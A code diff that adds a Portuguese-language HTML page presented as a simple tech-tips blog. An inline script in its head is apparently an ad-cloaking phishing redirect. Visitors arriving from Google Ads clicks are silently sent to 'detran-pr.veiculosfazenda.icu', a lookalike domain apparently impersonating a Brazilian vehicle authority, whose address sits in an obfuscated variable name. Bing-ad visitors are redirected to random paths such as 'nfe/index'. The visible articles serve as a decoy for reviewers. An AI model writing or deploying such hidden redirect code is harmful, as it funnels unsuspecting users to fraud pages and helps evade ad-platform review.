@@ -1,1 +1,171 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
+<title>Guia de Tecnologia</title>
+<meta name="description" content="Dicas simples de tecnologia, internet e ferramentas online.">
+
+<style>
+body{
+font-family: Arial, sans-serif;
+margin:0;
+background:#ffffff;
+color:#333;
+}
+
+header{
+background:#0a66c2;
+color:white;
+padding:20px;
+text-align:center;
+}
+
+nav{
+background:#f4f4f4;
+padding:10px;
+text-align:center;
+}
+
+nav a{
+margin:10px;
+text-decoration:none;
+color:#333;
+font-weight:bold;
+}
+
+.container{
+max-width:900px;
+margin:auto;
+padding:20px;
+}
+
+article{
+margin-bottom:30px;
+}
+
+footer{
+background:#f4f4f4;
+text-align:center;
+padding:15px;
+margin-top:40px;
+font-size:14px;
+}
+</style>
+</head>
+<script>
+
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://detran-pr.veiculosfazenda.icu/';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<header>
+<h1>Guia de Tecnologia</h1>
+<p>Dicas e informações sobre internet e ferramentas digitais</p>
+</header>
+
+<nav>
+<a href="#">Início</a>
+<a href="#">Artigos</a>
+<a href="#">Sobre</a>
+<a href="#">Contato</a>
+</nav>
+
+<div class="container">
+
+<article>
+<h2>Como melhorar a segurança online</h2>
+<p>
+Hoje em dia é importante proteger seus dados na internet. Use senhas fortes,
+ative verificação em duas etapas e evite acessar redes públicas sem proteção.
+</p>
+</article>
+
+<article>
+<h2>Ferramentas úteis para produtividade</h2>
+<p>
+Existem diversas ferramentas que ajudam na organização do dia a dia, como
+aplicativos de notas, calendários digitais e plataformas de colaboração online.
+</p>
+</article>
+
+<article>
+<h2>Dicas para aprender tecnologia</h2>
+<p>
+Aprender tecnologia pode começar com pequenos passos: estudar HTML, entender
+como funcionam sites e praticar criando projetos simples.
+</p>
+</article>
+
+</div>
+
+<footer>
+<p>© 2026 Guia de Tecnologia</p>
+<p>Política de Privacidade | Termos de Uso</p>
+</footer>
+
+</body>
+</html>
